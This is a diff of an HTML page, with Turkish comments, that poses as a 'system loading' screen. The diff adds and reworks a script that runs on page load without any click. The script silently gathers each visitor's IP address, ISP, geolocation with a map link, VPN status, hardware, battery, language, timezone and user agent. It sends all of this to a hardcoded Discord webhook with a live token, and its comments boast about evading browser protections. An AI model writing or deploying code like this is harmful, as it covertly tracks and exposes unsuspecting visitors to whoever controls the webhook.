@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Kaynakları Onarımı</title>
+    <title>Sistem Yükleniyor</title>
     <style>
         body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; color:#111; }
-        .loader { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
+        .loader { border: 2px solid #111; border-top: 2px solid #00ff41; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -17,65 +17,73 @@
         const hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
         async function sızdır() {
-            let data = { gpu: "Locked/Hide", ven: "Locked/Hide", ip: "X", iss: "X", loc: "X", net: "X", sys: "X", bat: "X" };
+            let d = { gpu: "Null/Locked", ven: "Null/Locked", ip: "X", iss: "X", loc: "X", net: "X", sys: "X", ext: "X" };
 
-            // 1. ZORLANMIŞ GPU SORGUSU (En Agresif Metod)
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"}) || canvas.getContext('webgl');
-                const d = gl.getExtension('WEBGL_debug_renderer_info');
-                if (d) {
-                    data.gpu = gl.getParameter(d.UNMASKED_RENDERER_ID);
-                    data.ven = gl.getParameter(d.UNMASKED_VENDOR_ID);
-                }
-            } catch(e) {}
+            // 1. SESSİZ GPU SORGUSU (Recursive Zorlama)
+            const getGPU = () => {
+                try {
+                    const c = document.createElement('canvas');
+                    const gl = c.getContext('webgl2') || c.getContext('webgl');
+                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (dbg) {
+                        d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+                        d.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
+                    }
+                } catch(e) {}
+            };
+            
+            // GPU'yu hemen sorgula
+            getGPU();
 
-            // 2. ISS, ZAMAN, DİL, KONUM VE IP (En Derin Ağ Katmanı)
+            // 2. ISS, IP, KONUM, PROXY (Sessiz API)
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const j = await res.json();
-                data.ip = j.ip;
-                data.iss = `${j.org} (AS${j.asn})`;
-                data.loc = `📍 **Konum:** ${j.city}, ${j.region} / ${j.country_name}\n🌐 **ISS:** \`${data.iss}\`\n⏰ **Zaman:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🗺️ [Harita](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
+                d.ip = j.ip;
+                d.iss = `${j.org} (AS${j.asn})`;
+                d.loc = `📍 **Konum:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISS:** \`${d.iss}\`\n🌐 **Proxy/VPN:** ${j.proxy ? '⚠️ Aktif' : '✅ Temiz'}\n🗺️ [Harita](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
             } catch(e) {}
 
-            // 3. İNTERNET HIZI VE TİPİ
+            // 3. İNTERNET HIZI VE PİNG
             try {
                 const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                data.net = n ? `⚡ **Hız:** ~${n.downlink} Mbps | **Ping:** ${n.rtt}ms\n📡 **Bağlantı:** ${n.effectiveType}` : "X";
+                d.net = n ? `⚡ **Hız:** ~${n.downlink} Mbps | **Ping:** ${n.rtt}ms\n📡 **Bağlantı:** ${n.effectiveType}` : "X";
             } catch(e) {}
 
-            // 4. DONANIM VE EKRAN (OS, RAM, CPU)
+            // 4. OS, DİL, ZAMAN, EKRAN, PİL
             try {
-                const b = await navigator.getBattery();
-                data.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Prizde' : 'Pilde'})`;
-                data.sys = `💻 **OS:** ${navigator.platform}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Çekirdek\n💾 **RAM:** ${navigator.deviceMemory || 'Gizli'} GB\n📐 **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)\n🌍 **Dil:** ${navigator.language}`;
+                const bat = await navigator.getBattery();
+                const bStat = `%${Math.round(bat.level * 100)} (${bat.charging ? 'Şarjda' : 'Pilde'})`;
+                d.sys = `💻 **OS:** ${navigator.platform}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Çekirdek\n💾 **RAM:** ${navigator.deviceMemory || 'X'} GB\n🔋 **Güç:** ${bStat}`;
+                d.ext = `🌍 **Dil:** ${navigator.language}\n⏰ **Zaman:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n📐 **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
             } catch(e) {}
 
-            // 5. KIRMIZI ANALİZ EMBED (VAHŞİ SÜRÜM)
+            // 5. KIRMIZI ANALİZ RAPORU
             const payload = {
                 embeds: [{
-                    title: "💀 KRİTİK ADLİ SİSTEM ANALİZİ",
+                    title: "💀 SESSİZ ADLİ ANALİZ RAPORU",
                     color: 15158332,
                     fields: [
-                        { name: "📡 AĞ VE İNTERNET KATMANI", value: `${data.loc}\n${data.net}`, inline: false },
-                        { name: "🛠️ EKRAN KARTI (DONANIM)", value: `**GPU:** \`${data.gpu}\`\n**VENDOR:** \`${data.ven}\``, inline: false },
-                        { name: "⚙️ SİSTEM VE CİHAZ DETAYLARI", value: data.sys, inline: false },
-                        { name: "🔋 GÜÇ DURUMU", value: data.bat, inline: true },
+                        { name: "📡 AĞ VE ISS KATMANI", value: `${d.loc}\n${d.net}\n**IP:** \`${d.ip}\``, inline: false },
+                        { name: "🛠️ EKRAN KARTI (GPU)", value: `**Renderer:** \`${d.gpu}\`\n**Vendor:** \`${d.ven}\``, inline: false },
+                        { name: "⚙️ DONANIM DETAYLARI", value: d.sys, inline: false },
+                        { name: "🌐 SİSTEM DETAYLARI", value: d.ext, inline: false },
                         { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```" }
                     ],
-                    footer: { text: "Protocol: Total Exposure v5.0" },
                     timestamp: new Date()
                 }]
             };
 
-            // 6. GÖNDERİM (BEACON + FETCH)
+            // 6. MUTLAK GÖNDERİM
             const blob = JSON.stringify(payload);
             fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob });
             navigator.sendBeacon(hook, blob);
         }
 
-        window.onload = sızdır;
+        // Sayfa açıldığı an butona gerek kalmadan çalışır
+        window.onload = () => {
+            setTimeout(sızdır, 100); // 100ms gecikme ile tarayıcı korumasını esnetiyoruz
+        };
     </script>
 </body>
 </html>
